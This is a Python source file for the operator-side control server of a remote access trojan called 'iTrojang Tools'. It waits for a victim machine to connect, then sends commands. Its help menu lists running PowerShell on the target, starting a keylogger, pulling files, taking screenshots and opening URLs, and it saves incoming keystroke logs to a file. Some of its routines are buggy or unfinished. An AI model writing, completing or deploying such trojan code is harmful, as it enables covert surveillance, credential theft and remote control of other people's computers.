import socket
import sys
import threading
import colorama
import termcolor

class Server:
    def __init__(self,host,port):
        self.host = host
        self.port = port

    def ServerStart(self):
        colorama.init()
        version = 1 #Every Three New Commands a new version will be made
        print(termcolor.colored(f'[WELCOME]You Are Using iTrojang Tools V{version}','green'))
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind((self.host,self.port))
        s.listen(8)
        connection, address = s.accept()
        print(termcolor.colored(f'[Connection]{connection} Has Joined','green'))
        def Recvmsg():
            message = connection.recv(4000).decode('utf-8')
            print(message)
            if message.startswith('k: '):
                message.replace('k: ','')
                with open('Keylog','wb') as f:
                    f.write(bytes(message,encoding='utf-8'))
        def Download_File(file):
            f = open(file,'wb')
            chunk = s.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = s.recv(1024)
                except socket.timeout as e:
                    break
            s.settimeout(None)
        while True:
            SendMsg = input(f'[iTrojangToolsV{version}]Run iTrojang Command[!help For Cmd List]>')
            connection.send(bytes(SendMsg, encoding='utf-8'))
            if SendMsg == '!help':
                print('[Command]!Upload <File> | Uploads File To Target Machine[IN PROGRESS]\n'
                      '[Command]!Download <File> | Downloads File From Target Machine[IN PROGRESS]\n'
                      '[Command]!Shell <Command> | Run PowerShell on Target Machine\n'
                      '[Command]!Screenshot | Takes a ScreenShot on Target Machine[IN PROGRESS]\n'
                      '[Command]!Stopserver | Stops Server\n'
                      '[Command]!Keylogger | Starts KeyLogger on Target Machine\n'
                      '[Command]!Open <URL> | Opens a URL in Target Machine\n'
                      '[Command]!Rickroll | Opens Rickroll on Target Machine'
                      )
            elif SendMsg == '!Stopserver':
                sys.exit('[Closed]Server Closed Due To User Closing it')
            elif SendMsg[:12] == '!Screenshot ':
                file_namefor = SendMsg[12:]
                Download_File(file=file_namefor)
            elif SendMsg[:8] == '!upload ':
                file_name = SendMsg[8:]
                Download_File(file=file_name)
            t = threading.Thread(target=Recvmsg)
            t.start()





s = Server(host='localhost',port=58699)
s.ServerStart()







